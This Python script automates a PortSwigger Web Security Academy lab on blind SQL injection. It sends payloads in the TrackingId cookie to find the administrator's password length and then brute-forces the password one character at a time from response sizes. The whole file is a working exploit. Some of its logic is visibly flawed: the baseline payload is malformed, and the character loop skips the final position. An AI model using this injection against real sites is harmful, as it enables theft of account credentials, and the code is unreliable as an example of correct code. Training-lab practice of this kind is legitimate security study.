import requests
import argparse


parser = argparse.ArgumentParser(description="Automate PortSwigger's 'Blind SQLi with conditional responses' challenge. e.g. python3 blind-sqli-cookie.py -u https://ace01f221e2b5a5f803c80580022002f.web-security-academy.net/ -t dOgxWeuy9yyZBE2w")
parser.add_argument("-u", "--url", help="Your PortSwigger lab URL")
parser.add_argument("-t", "--trackingID", help="Your tracking ID cookie value e.g. jJAX7Coxb9gbyFMq")
args = parser.parse_args()

print(f"URL = {args.url}")
print(f"Tracking ID = {args.trackingID}")

s = requests.Session()


# Identify length of password
def getInitialSize():
    sql_payload = f"' and (select 'a' from users where username='administrator' and length(password)>)='a"
    cookies = {"TrackingId": f"{args.trackingID}{sql_payload}"}
    
    url = args.url
    response = s.get(url, cookies=cookies)
    initial_size = len(response.content)
    print(f"Initial size is: {initial_size}")
    return initial_size

initial_size = getInitialSize()
password_length = 0
positive_size = 0

print("Finding password length, wait a minute.")

for pos in range(1,25):
    sql_payload = f"' and (select 'a' from users where username='administrator' and length(password)>{pos})='a"
    cookies = {"TrackingId": f"{args.trackingID}{sql_payload}"}
    
    url = args.url
    response = s.get(url, cookies=cookies)

    if len(response.content) <= initial_size:
        print(f"Password is {pos} characters long.")
        password_length = pos
        positive_size = len(response.content)
        break

# Guess password
print("Now bruteforcing all characters.")
valid_chars = []
for pos in range(1,password_length):
    password_guesses = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    for guess in password_guesses:
        sql_payload = f"' and (select substring(password,{pos},1) from users where username='administrator')='{guess}"
        cookies = {"TrackingId": f"{args.trackingID}{sql_payload}"}

        url = args.url
        response = s.get(url, cookies=cookies)

        if len(response.content) > initial_size:
            valid_chars.append(sql_payload[-1])
            # print(valid_chars)
            print("Password: " + ''.join(valid_chars) + "...")

print("All done!")
        
